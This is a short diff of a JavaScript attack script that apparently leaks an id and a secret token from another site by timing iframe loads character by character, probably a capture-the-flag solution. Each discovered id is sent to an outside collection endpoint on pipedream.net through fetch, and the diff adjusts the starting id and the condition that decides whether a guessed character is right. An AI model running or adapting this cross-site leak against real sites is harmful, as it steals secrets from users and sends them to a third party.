@@ -21,7 +21,7 @@
         const endpoint = "https://enouh66iqn4bc.x.pipedream.net/";
 
         let c = 0;
-        let id = 12500;
+        let id = 392;
         let token = "";
         let isSearching = true;
 
@@ -54,14 +54,14 @@
             fetch(endpoint + "?id=" + id);
             baseUrl = baseUrl + id + "/";
         };
-
+        
         const findToken = async () => {
             const loopPromise = () =>
                 new Promise((resolve) => {
                     const start = performance.now();
                     ff.onload = () => {
                         const timing = performance.now() - start;
-                        if (timing < 1000) {
+                        if (timing < 1000 || token.startsWith('f')) {
                             // not found
                             c += 1;
                             if (c === CHAR_LIST.length) {
